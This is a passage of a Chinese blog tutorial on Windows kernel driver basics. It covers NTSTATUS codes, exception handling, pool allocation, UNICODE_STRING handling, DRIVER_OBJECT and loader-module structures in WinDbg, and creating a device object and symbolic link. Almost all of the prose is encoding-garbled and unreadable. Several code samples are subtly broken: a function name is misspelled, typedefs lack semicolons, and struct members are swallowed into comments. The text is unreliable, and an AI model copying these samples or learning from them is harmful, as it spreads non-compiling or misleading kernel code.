<h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>å¤§éƒ¨åˆ†å†…æ ¸å‡½æ•°çš„è¿”å›å€¼éƒ½æ˜¯  NTSTATUSç±»å‹ï¼Œå®ƒæœ¬è´¨æ˜¯ä¸€ä¸ªå®ï¼Œé‡Œé¢åŒ…å«çš„ç±»å‹æœ‰å¾ˆå¤šï¼Œå¦‚ä¸‹ä¸‰ä¸ªå°±æ˜¯å¸¸è§çš„è¿”å›å€¼: </p>
<table>
<thead>
<tr>
<th>å®åç§°</th>
<th>å®é™…å€¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>STATUS_SUCCESS</td>
<td>0x00000000</td>
<td>æˆåŠŸ</td>
</tr>
<tr>
<td>STATUS_INVALID_PARAMETER</td>
<td>0xC000000D</td>
<td>å‚æ•°æ— æ•ˆ</td>
</tr>
<tr>
<td>STATUS_BUFFER_OVERFLOW</td>
<td>0x80000005</td>
<td>ç¼“å†²åŒºé•¿åº¦ä¸å¤Ÿ</td>
</tr>
</tbody></table>
<p>å½“è°ƒç”¨å†…æ ¸å‡½æ•°å¤±è´¥æ—¶ å³è¿”å›ç»“æ„ä¸æ˜¯STATUS_SUCCESS é‚£ä¹ˆå¯ä»¥æ ¹æ®è¿”å›å€¼åœ¨ ntstatus.h å¤´æ–‡ä»¶ä¸­å»æŸ¥æ‰¾ ä¹Ÿå¯åœ¨å¾®è½¯çš„SDKæ–‡æ¡£æœç´¢ç›¸å…³å®åç§°</p>
<p><img src="/posts/dc4ad149/1.png" alt="img"></p>
<h4 id="å†…æ ¸ä¸­çš„å¼‚å¸¸å¤„ç†"><a href="#å†…æ ¸ä¸­çš„å¼‚å¸¸å¤„ç†" class="headerlink" title="å†…æ ¸ä¸­çš„å¼‚å¸¸å¤„ç†"></a>å†…æ ¸ä¸­çš„å¼‚å¸¸å¤„ç†</h4><p> åœ¨å†…æ ¸ä¸­ä¸€ä¸ªå°å°çš„é”™è¯¯å°±å¯èƒ½å¯¼è‡´è“å±ï¼Œä¾‹å¦‚æˆ‘ä»¬å»è¯»å†™ä¸€ä¸ªæ— æ•ˆçš„å†…å­˜åœ°å€ã€‚ä¸ºäº†è®©è‡ªå·±çš„å†…æ ¸ç¨‹åºæ›´åŠ  å¥å£®ï¼Œåœ¨ç¼–å†™å†…æ ¸ç¨‹åºæ—¶è¦ä½¿ç”¨åˆ°å¼‚å¸¸å¤„ç†ã€‚                         </p>
<p>åœ¨Windowsä¸‹æä¾›äº†ç»“æ„åŒ–å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œç¼–è¯‘å™¨æ™®ééƒ½æ”¯æŒï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// å¡«å…¥å¯èƒ½è¦å‡ºé”™çš„ä»£ç  &#125;</span></span><br><span class="line">__except (filter_value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// å¡«å…¥å‡ºé”™åè¦æ‰§è¡Œçš„ä»£ç  &#125;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸Šç¤ºä¾‹ä¸­çš„filter_valueï¼Œå°±æ˜¯å½“å†…æ ¸ç¨‹åºå‡ºç°å¼‚å¸¸æ—¶å†³å®šç¨‹åºå¦‚ä½•æ‰§è¡Œçš„ï¼Œä¸€èˆ¬æœ‰è¿™ä¸‰ç§æƒ…å†µ: </p>
<table>
<thead>
<tr>
<th>å®åç§°</th>
<th>å®é™…å€¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>EXCEPTION_EXECUTE_HANDLER</td>
<td>1</td>
<td>è¿›å…¥exceptä»£ç å—æ‰§è¡Œ</td>
</tr>
<tr>
<td>EXCEPTION_CONTINUE_SEARCH</td>
<td>0</td>
<td>ä¸å¤„ç†å¼‚å¸¸ï¼Œç”±ä¸Šä¸€å±‚è°ƒç”¨å‡½æ•°å¤„ç†</td>
</tr>
<tr>
<td>EXCEPTION_CONTINUE_EXECUTION</td>
<td>-1</td>
<td>ç»§ç»­æ‰§è¡Œé”™è¯¯å¤„çš„ä»£ç </td>
</tr>
</tbody></table>
<h4 id="å¸¸ç”¨çš„å†…æ ¸å†…å­˜å‡½æ•°"><a href="#å¸¸ç”¨çš„å†…æ ¸å†…å­˜å‡½æ•°" class="headerlink" title="å¸¸ç”¨çš„å†…æ ¸å†…å­˜å‡½æ•°"></a>å¸¸ç”¨çš„å†…æ ¸å†…å­˜å‡½æ•°</h4><p>å¯¹å†…å­˜çš„ä½¿ç”¨ä¸»è¦æ˜¯ ç”³è¯·ã€è®¾ç½®ã€æ‹·è´ã€é‡Šæ”¾ å¸¸ç”¨å‡½æ•°å¦‚ä¸‹é›†åˆåº”ç”¨å±‚ä¸å†…æ ¸å±‚å¯¹æ¯”</p>
<table>
<thead>
<tr>
<th>åº”ç”¨å±‚</th>
<th>å†…æ ¸</th>
</tr>
</thead>
<tbody><tr>
<td>malloc</td>
<td>ExAllocatePool</td>
</tr>
<tr>
<td>memset</td>
<td>RtlFillMemory</td>
</tr>
<tr>
<td>memcpy</td>
<td>RtlMoveMemory</td>
</tr>
<tr>
<td>free</td>
<td>ExFreePool</td>
</tr>
</tbody></table>
<h5 id="ä½¿ç”¨å†…å­˜"><a href="#ä½¿ç”¨å†…å­˜" class="headerlink" title="ä½¿ç”¨å†…å­˜"></a>ä½¿ç”¨å†…å­˜</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é…</span></span><br><span class="line">PVOID <span class="title function_">ExAllocatePoolWithTag</span><span class="params">(</span></span><br><span class="line"><span class="params">  POOL_TYPE PoolType, <span class="comment">//ç”³è¯·çš„å†…å­˜ç±»å‹ å¸¸ç”¨å€¼ï¼šNonPagedPoolè¡¨ç¤ºå¯æ‰§è¡Œçš„éåˆ†é¡µå†…å­˜ï¼ŒPagedPoolåˆ†é¡µå†…å­˜ï¼ŒNonPagedPoolNxä¸å¯æ‰§è¡Œçš„éåˆ†é¡µå†…å­˜ Nxä¸å¯æ‰§è¡Œ</span></span></span><br><span class="line"><span class="params">  SIZE_T NumberOfBytes,<span class="comment">//ç”³è¯·çš„å†…å­˜å¤§å°ï¼Œå•ä½å­—èŠ‚</span></span></span><br><span class="line"><span class="params">  ULONG Tag<span class="comment">//4å­—èŠ‚çš„æ ‡å¿—ï¼Œç”¨äºè°ƒè¯•ï¼Œä¸å…³å¿ƒä¼ é€’0æˆ–è€…ä½¿ç”¨ExAllocatePool</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//åˆ†é…æˆåŠŸè¿”å›å†…å­˜é¦–åœ°å€ï¼Œå¤±è´¥è¿”å›NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡Šæ”¾</span></span><br><span class="line">VOID <span class="title function_">ExFreePoolWithTag</span> <span class="params">(</span></span><br><span class="line"><span class="params">    PVOID P,<span class="comment">//å†…å­˜å—åœ°å€</span></span></span><br><span class="line"><span class="params">    ULONG Tag<span class="comment">//ç”³è¯·æ—¶çš„æ ‡è®°</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="comment">//ExAllocatePoolå¯¹åº”é‡Šæ”¾å‡½æ•°ExFreePool </span></span><br></pre></td></tr></table></figure>

<h4 id="å†…æ ¸ä¸­çš„å­—ç¬¦ä¸²"><a href="#å†…æ ¸ä¸­çš„å­—ç¬¦ä¸²" class="headerlink" title="å†…æ ¸ä¸­çš„å­—ç¬¦ä¸²"></a>å†…æ ¸ä¸­çš„å­—ç¬¦ä¸²</h4><h5 id="å†…æ ¸å­—ç¬¦ä¸²ç§ç±»"><a href="#å†…æ ¸å­—ç¬¦ä¸²ç§ç±»" class="headerlink" title="å†…æ ¸å­—ç¬¦ä¸²ç§ç±»"></a>å†…æ ¸å­—ç¬¦ä¸²ç§ç±»</h5><p>CHAR(char)ã€WCHAR(wchar_t)ã€ANSI_STRINGã€UNICODE_STRING </p>
<p>CHARæ˜¯charåœ¨å†…æ ¸ä¸­çš„å†™æ³•ï¼ŒWCHARæ˜¯wchar_tæ˜¯åœ¨å†…æ ¸ä¸­çš„å†™æ³•ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸å»ºè®®ä½¿ç”¨è¿™ä¸¤ç§ è€Œä½¿ç”¨åä¸¤è€… <strong>ANSI_STRING</strong>å’Œ<strong>UNICODE_STRINGï¼ˆAscii/Unicodeï¼‰</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	<span class="meta">#<span class="keyword">ifdef</span> MIDL_PASS</span></span><br><span class="line">	[size_is(MaximumLength), length_is(Length) ]</span><br><span class="line">	<span class="meta">#<span class="keyword">endif</span> <span class="comment">// MIDL_PASS</span></span></span><br><span class="line">	Field_size_bytes_part_opt_(MaximumLength, Length) PCHAR Buffer;</span><br><span class="line">&#125; STRING;</span><br><span class="line"><span class="keyword">typedef</span> STRING ANSI_STRING</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	<span class="meta">#<span class="keyword">ifdef</span> MIDL_PASS</span></span><br><span class="line">	[size_is(MaximumLength / <span class="number">2</span>), length_is((Length) / <span class="number">2</span>) ] USHORT * Buffer;</span><br><span class="line">	<span class="meta">#<span class="keyword">else</span> <span class="comment">// MIDL_PASS</span></span></span><br><span class="line">	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span> <span class="comment">// MIDL_PASS</span></span></span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure>

<h5 id="å†…æ ¸å­—ç¬¦ä¸²å‡½æ•°"><a href="#å†…æ ¸å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="å†…æ ¸å­—ç¬¦ä¸²å‡½æ•°"></a>å†…æ ¸å­—ç¬¦ä¸²å‡½æ•°</h5><p>å­—ç¬¦ä¸²çš„æ“ä½œå°±æ˜¯åˆ›å»ºã€å¤åˆ¶ã€æ¯”è¾ƒã€è½¬æ¢ï¼Œä½†ç”±äºç¼–ç é—®é¢˜åœ¨å†…æ ¸ä¸­ä¹Ÿæœ‰ä¸åŒçš„å‡½æ•°è¡¨è¾¾: </p>
<table>
<thead>
<tr>
<th>ANSI_STRINGå­—ç¬¦ä¸²</th>
<th>UNICODE_STRINGå­—ç¬¦ä¸²</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>RtlInitAnsiString</td>
<td>RtlInitUnicodeString</td>
<td>åˆ›å»ºå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>RtlCopyString</td>
<td>RtlCopyUnicodeString</td>
<td>å­—ç¬¦ä¸²å¤åˆ¶</td>
</tr>
<tr>
<td>RtlCompareString</td>
<td>RtlCompareUnicoodeString</td>
<td>å­—ç¬¦ä¸²æ¯”è¾ƒ</td>
</tr>
<tr>
<td>RtlAnsiStringToUnicodeString</td>
<td>RtlUnicodeStringToAnsiString</td>
<td>ç¼–ç è½¬æ¢</td>
</tr>
</tbody></table>
<h5 id="å†…æ ¸å­—ç¬¦ä¸²æ“ä½œ"><a href="#å†…æ ¸å­—ç¬¦ä¸²æ“ä½œ" class="headerlink" title="å†…æ ¸å­—ç¬¦ä¸²æ“ä½œ"></a>å†…æ ¸å­—ç¬¦ä¸²æ“ä½œ</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//UNICODE_STRINGåˆå§‹åŒ–</span></span><br><span class="line">UNICODE_STRING Demostring = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitUnicodeString(&amp;Demostring, <span class="string">L&quot;This is a ....\n&quot;</span>);</span><br><span class="line">DbgPrint(<span class="string">&quot;%wZ&quot;</span>, &amp;Demostring);</span><br><span class="line"><span class="comment">//æµ…æ‹·è´ï¼ˆåªæ‹·è´åœ°å€ å°†åœ°å€æŒ‡å‘åŒä¸€åœ°æ–¹ï¼‰ å°†bufferæŒ‡å‘å­—ç¬¦ä¸²çš„åœ°å€</span></span><br><span class="line">UNICODE_STRING naizistring = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR str[] = <span class="string">L&quot;hacker...\n&quot;</span>;</span><br><span class="line">RtlInitUnicodeString(&amp;naizistring, str);</span><br><span class="line">str[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">DbgPrint(<span class="string">&quot;%wZ&quot;</span>, &amp;naizistring);</span><br><span class="line"><span class="comment">//æ·±æ‹·è´(copy)</span></span><br><span class="line"><span class="comment">//#include &quot;Ntstrfase.h&quot;</span></span><br><span class="line">WCHAR str[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">UNICODE_STRING naizistring = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitEmptyUnicodeString(&amp;naizistring, str, <span class="keyword">sizeof</span>(str));</span><br><span class="line">RtlUnicodeStringCopyString(&amp;naizistring, <span class="string">L&quot;naizi hacker&quot;</span>);</span><br><span class="line">DbgPrint(<span class="string">&quot;%wZ&quot;</span>, &amp;naizistring);</span><br></pre></td></tr></table></figure>

<h4 id="å†…æ ¸ç©ºé—´ä¸å†…å­˜æ¨¡å—"><a href="#å†…æ ¸ç©ºé—´ä¸å†…å­˜æ¨¡å—" class="headerlink" title="å†…æ ¸ç©ºé—´ä¸å†…å­˜æ¨¡å—"></a>å†…æ ¸ç©ºé—´ä¸å†…å­˜æ¨¡å—</h4><p>è¿›ç¨‹ä¸­æœ‰ä¸€ä¸ª4GBå¤§å°çš„å†…å­˜ç©ºé—´  ä½2Gæ˜¯ç¨‹åºè‡ªå·±çš„ é«˜2Gæ˜¯å…±äº«çš„</p>
<p><img src="/posts/dc4ad149/2.png" alt="img"></p>
<p>æŒ‰ç…§è§„å®šæ ¼å¼ç¼–å†™çš„é©±åŠ¨ æ¯ä¸€ä¸ªéƒ½å¯ä»¥å½“åšä¸€ä¸ªæ¨¡å—ï¼Œä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºå†…æ ¸æ¨¡å—ï¼Œéƒ½éµå¾ªPEç»“æ„ï¼Œå¹¶å¯ä»¥åŠ è½½åˆ°å†…æ ¸ä¸­</p>
<p>åœ¨ç¼–å†™æ—¶ ä¸€èˆ¬éƒ½éœ€è¦ä¸€ä¸ªå…¥å£å‡½æ•°å’Œä¸€ä¸ªå¸è½½å‡½æ•°</p>
<p>åœ¨å…¥å£å‡½æ•°ä¸­éœ€è¦ä¸¤ä¸ªå‚æ•°  <strong>PDRIVER_OBJECT</strong> å’Œ <strong>PUNICODE_STRING</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING   RegistryPath)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/3.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">	CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PVOID DriverStart; <span class="comment">// ç»“æ„ä½“å¯¹åº”çš„é©±åŠ¨ç¨‹åºåœ¨å†…æ ¸ç©ºé—´çš„ä½ç½®</span></span><br><span class="line">    ULONG DriverSize; <span class="comment">// ç»“æ„ä½“å¯¹åº”çš„é©±åŠ¨ç¨‹åºçš„å¤§å°</span></span><br><span class="line">    PVOID DriverSection; <span class="comment">// æŒ‡é’ˆï¼ŒæŒ‡å‘_LDR_DATA_TABLE_ENTRYç»“æ„ä½“ PDRIVER_EXTENSION DriverExtension;</span></span><br><span class="line">    UNICODE_STRING DriverName; <span class="comment">// ç»“æ„ä½“å¯¹åº”çš„é©±åŠ¨ç¨‹åºçš„åå­— PUNICODE_STRING HardwareDatabase;</span></span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload; <span class="comment">// å®šä¹‰é©±åŠ¨ç¨‹åºå¸è½½å‡½æ•°çš„åœ°å€ PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];</span></span><br><span class="line"> &#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¹‹å‰çš„demoDriver å¯ä»¥æ‰¾åˆ°é©±åŠ¨å¯¹è±¡åœ°å€</p>
<p><img src="/posts/dc4ad149/4.png" alt="img"></p>
<p>é€šè¿‡windbgè¿›å…¥åˆ°å…¶ä¸­æŸ¥çœ‹                                     </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _DRIVER_OBJECT é©±åŠ¨å¯¹è±¡åœ°å€ </span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/5.png" alt="img"></p>
<p>DriverSection; // æŒ‡é’ˆ  æŒ‡å‘_LDR_DATA_TABLE_ENTRYç»“æ„ä½“ ,åœ¨è¯¥ç»“æ„ä½“å†…æœ‰ä¸€ä¸ªæˆå‘˜InLoadOrderLinksæ˜¯åŒé“¾è¡¨ï¼Œå®ƒè®°å½•ç€å‰ä¸€ä¸ªå’Œåä¸€ä¸ªå†…æ ¸æ¨¡å—çš„_LDR_DATA_TABLE_ENTRYç»“æ„ä½“åœ°å€: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _LDR_DATA_TABLE_ENTRY  0xffffc90e4c1f98d0</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/6.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _LDR_DATA_TABLE_ENTRY 0xffffc90e4cc04a10</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/7.png" alt="img"></p>
<h4 id="åº”ç”¨ä¸å†…æ ¸é—´é€šä¿¡"><a href="#åº”ç”¨ä¸å†…æ ¸é—´é€šä¿¡" class="headerlink" title="åº”ç”¨ä¸å†…æ ¸é—´é€šä¿¡"></a>åº”ç”¨ä¸å†…æ ¸é—´é€šä¿¡</h4><h5 id="åˆ›å»ºè®¾å¤‡å¯¹è±¡"><a href="#åˆ›å»ºè®¾å¤‡å¯¹è±¡" class="headerlink" title="åˆ›å»ºè®¾å¤‡å¯¹è±¡"></a>åˆ›å»ºè®¾å¤‡å¯¹è±¡</h5><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªè®¾å¤‡å¯¹è±¡æ˜¯å¯¹åº”ä¸€ä¸ªè®¾å¤‡çš„ï¼Œå¦‚:é¼ æ ‡ã€é”®ç›˜ã€‚ä½†æ˜¯è®¾å¤‡å¯¹è±¡ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼Œä¸ å¯¹åº”åˆ°å…·ä½“æŸä¸ªç¡¬ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç å»åˆ›å»ºä¸€ä¸ªè®¾å¤‡å¯¹è±¡ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSTATUS Status;	<span class="comment">//åˆå§‹åŒ–è¿”å›çŠ¶æ€</span></span><br><span class="line">UNICODE_STRING DeviceName;	<span class="comment">// åˆ›å»ºè®¾å¤‡åç§°</span></span><br><span class="line">UNICODE_STRING SymbolName;	<span class="comment">//ç¬¦å·é“¾æ¥</span></span><br><span class="line">PDEVICE_OBJECT dev = <span class="literal">NULL</span>;<span class="comment">//åˆå§‹åŒ– æ§åˆ¶è®¾å¤‡</span></span><br><span class="line">RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>); <span class="comment">// è®¾å¤‡åç§° PDEVICE_OBJECT pDeviceObj = NULL;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">Status = IoCreateDevice(</span><br><span class="line">    DriverObject, <span class="comment">// è°ƒç”¨æ–¹é©±åŠ¨ç¨‹åºå¯¹è±¡</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    &amp;DeviceName, <span class="comment">// è®¾å¤‡åç§°</span></span><br><span class="line">    FILE_DEVICE_UNKNOWN, <span class="comment">// è®¾å¤‡ç±»å‹ï¼Œå½“å‰ä¸ä¸æŸä¸ªå…·ä½“è®¾å¤‡æŒ‚é’©ï¼Œæ‰€ä»¥ç±»å‹ä¸ºUNKNOWN </span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//FILE_DEVICE_SECURE_OPEN, // è®¾å¤‡å±æ€§ï¼Œå¤§å¤šæ•°é©±åŠ¨ç¨‹åºä»…æŒ‡å®š FILE_DEVICE_SECURE_OPEN å±æ€§ï¼Œ è¿™å¯ç¡®ä¿å°†ç›¸åŒçš„å®‰å…¨è®¾ç½®åº”ç”¨åˆ°è®¾å¤‡çš„å‘½åç©ºé—´ä¸­çš„ä»»ä½•æ‰“å¼€çš„è¯·æ±‚</span></span><br><span class="line">    TRUE,<span class="comment">//FALSE, // è®¾å¤‡å¯¹è±¡æ˜¯å¦è¡¨ç¤ºç‹¬å è®¾å¤‡ï¼Œå¦‚æœå¯ç”¨äº†å¯¹è®¾å¤‡çš„ç‹¬å è®¿é—®ï¼Œåˆ™ä¸€æ¬¡åªèƒ½æ‰“å¼€è®¾å¤‡çš„ä¸€ä¸ªå¥æŸ„ </span></span><br><span class="line">    &amp;dev <span class="comment">// åˆ›å»ºçš„è®¾å¤‡å¯¹è±¡ï¼ŒæŒ‡å‘æ¥æ”¶æŒ‡å‘æ–°åˆ›å»ºçš„ DEVICE_OBJECT ç»“æ„çš„æŒ‡é’ˆçš„å˜é‡çš„æŒ‡é’ˆ</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status))<span class="comment">//ä¸æˆåŠŸ</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (Status == STATUS_OBJECT_NAME_COLLISION)<span class="comment">//åç§°å†²çª</span></span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[*]è®¾å¤‡åç§°å†²çª......\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]åˆ›å»ºå¤±è´¥&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//åˆå§‹åŒ–ç¬¦å·é“¾æ¥  (è®¾å¤‡åº”ç”¨ç¨‹åºä¸å¯è§ å› æ­¤é©±åŠ¨è¦æš´æ¼ä¸€ä¸ªç¬¦å·é“¾æ¥ç»™åº”ç”¨å±‚</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		Status = IoCreateSymbolicLink(&amp;SymbolName, &amp;DeviceName);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123; <span class="comment">//ä¸ç­‰äº0</span></span><br><span class="line">			IoDeleteDevice(dev); <span class="comment">//åˆ é™¤è®¾å¤‡</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]åˆ é™¤è®¾å¤‡æˆåŠŸ&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]åˆ›å»ºç¬¦å·é“¾æ¥æˆåŠŸ&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Status;</span><br></pre></td></tr></table></figure>

<h5 id="æ•°æ®äº¤æ¢é…ç½®"><a href="#æ•°æ®äº¤æ¢é…ç½®" class="headerlink" title="æ•°æ®äº¤æ¢é…ç½®"></a>æ•°æ®äº¤æ¢é…ç½®</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®äº¤æ¢æ•°æ®æ–¹å¼</span></span><br><span class="line">pDeviceObj-&gt;Flags |= DO_BUFFERED_IO; <span class="comment">// ç¼“å†²åŒºè¯»å†™</span></span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºå¥½è®¾å¤‡å¯¹è±¡ä¹‹åï¼Œå°±éœ€è¦è®¾ç½®0ç¯å’Œ3ç¯äº¤æ¢æ•°æ®çš„æ–¹å¼ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æ–¹å¼:</p>
<ul>
<li><p>\1. ç¼“å†²åŒºè¯»å†™(<strong>DO_BUFFERED_IO</strong>)ï¼Œæ“ä½œç³»ç»Ÿå°†åº”ç”¨ç¨‹åºæä¾›ç¼“å†²åŒºçš„æ•°æ®ç›´æ¥å¤åˆ¶åˆ°å†…æ ¸æ¨¡å¼ä¸‹çš„åœ°å€ä¸­;</p>
</li>
<li><p>\2. ç›´æ¥è¯»å†™(<strong>DO_DIRECT_IO</strong>)ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†ç”¨æˆ·æ¨¡å¼ä¸‹çš„ç¼“å†²åŒºé”ä½ï¼Œç„¶åæ“ä½œç³»ç»Ÿå°†è¿™æ®µç¼“å†²åŒºåœ¨ å†…æ ¸æ¨¡å¼åœ°å€å†æ¬¡æ˜ å°„ä¸€éï¼Œè¿™æ ·ç”¨æˆ·æ¨¡å¼çš„ç¼“å†²åŒºå’Œå†…æ ¸æ¨¡å¼çš„ç¼“å†²åŒºæŒ‡å‘çš„æ˜¯åŒä¸€åŒºåŸŸçš„ç‰©ç†å†… å­˜ï¼Œç¼ºç‚¹å°±æ˜¯è¦å•ç‹¬å ç”¨ç‰©ç†é¡µé¢;</p>
</li>
<li><p>\3. å…¶ä»–è¯»å†™ï¼ˆ0ç¯ç›´æ¥è¯»å–3ç¯çº¿æ€§åœ°å€ï¼‰ï¼Œåœ¨è°ƒç”¨IoCreateDeviceå‡½æ•°åˆ›å»ºè®¾å¤‡åä¸è®¾ç½®äº¤æ¢æ•°æ®æ¨¡å¼å³é»˜è®¤ä¸ºå…¶ä»–æ–¹å¼è¯»å†™ï¼Œåœ¨ä½¿ç”¨ å…¶ä»–æ–¹å¼è¯»å†™è®¾å¤‡æ—¶ï¼Œæ´¾é£å‡½æ•°ç›´æ¥è¯»å†™åº”ç”¨ç¨‹åºæä¾›çš„ç¼“å†²åŒºåœ°å€ã€‚åœ¨é©±åŠ¨ç¨‹åºä¸­ï¼Œç›´æ¥æ“ä½œåº”ç”¨ç¨‹ åºçš„ç¼“å†²åŒºåœ°å€æ˜¯å¾ˆå±é™©çš„(<strong>ä¸å»ºè®®ä½¿ç”¨</strong>)ï¼Œåªæœ‰é©±åŠ¨ç¨‹åºä¸åº”ç”¨ç¨‹åºè¿è¡Œåœ¨ç›¸åŒçº¿ç¨‹ä¸Šä¸‹æ–‡çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚</p>
</li>
</ul>
<h5 id="è®¾å¤‡ç¬¦å·è¿æ¥"><a href="#è®¾å¤‡ç¬¦å·è¿æ¥" class="headerlink" title="è®¾å¤‡ç¬¦å·è¿æ¥"></a>è®¾å¤‡ç¬¦å·è¿æ¥</h5><p>è®¾å¤‡åç§°æ˜¯ç»™0ç¯ä½¿ç”¨çš„ï¼Œå¦‚æœ3ç¯æƒ³è¦è®¿é—®åˆ°è®¾å¤‡å°±éœ€è¦é€šè¿‡ç¬¦å·è¿æ¥ï¼Œå¯ä»¥ç†è§£æˆå®ƒæ˜¯ä¸€ä¸ªè®¾å¤‡çš„åˆ«åï¼Œå¦‚æœä¸è¿™æ ·è®¾ç½® 3ç¯æ— æ³•è®¿é—®åˆ°è®¾å¤‡ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºç¬¦å·é“¾æ¥</span></span><br><span class="line">UNICODE_STRING DeviceName;<span class="comment">//è®¾å¤‡åç§°</span></span><br><span class="line">UNICODE_STRING SymbolName;<span class="comment">//ç¬¦å·é“¾æ¥</span></span><br><span class="line">RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„:</p>
